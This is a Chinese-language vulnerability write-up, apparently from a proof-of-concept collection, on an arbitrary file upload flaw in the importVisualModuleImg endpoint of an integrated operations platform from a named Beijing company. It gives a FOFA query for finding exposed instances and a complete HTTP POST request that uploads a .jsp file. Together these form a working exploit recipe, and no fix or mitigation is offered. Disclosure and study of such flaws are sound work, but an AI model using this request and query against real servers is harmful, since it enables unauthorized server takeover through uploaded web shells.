## **北京中科聚网一体化运营平台importVisualModuleImg接口存在文件上传漏洞**

北京中科聚网信息技术有限公司的一体化运营平台是一个综合性的信息系统，旨在为企业或机构提供全方位的运营支持和管理服务。北京中科聚网信息技术有限公司一体化运营平台importVisualModuleImg接口存在文件上传漏洞，攻击者可利用此漏洞上传任意文件获取服务器权限。

## fofa

```yaml
title="一体化运营平台" || body="thirdparty/ueditor/WordPaster"
```

## poc

```yaml
POST /manage/tplresource/importVisualModuleImg?moduleId=2 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----9979a3f1-cdb1-43af-af88-a9b48b67cf71
Content-Length: 198
Cookie:  JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac; rememberMe=dcOzuzCzFrtr02GhN9IwcsR9v759kvzO9wq/upEQ0jwsU5y/25kFW52CaKmZoRP7pwH979ifBBXB3b+li3PSXwZmxnh+bMgi6kv5vv8WNkNdy1pblj7sPxtwIm71auJPyyOl+aMKAhk/71leMQLpneRk/8f6USYL/acFuWhpjyuVU6oP6YJdIoCKGgdxAiUk; 

------9979a3f1-cdb1-43af-af88-a9b48b67cf71
Content-Disposition: form-data; name="file"; filename="tmp.jsp"
Content-Type: multipart/form-data

6666
------9979a3f1-cdb1-43af-af88-a9b48b67cf71--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407101850568.png)



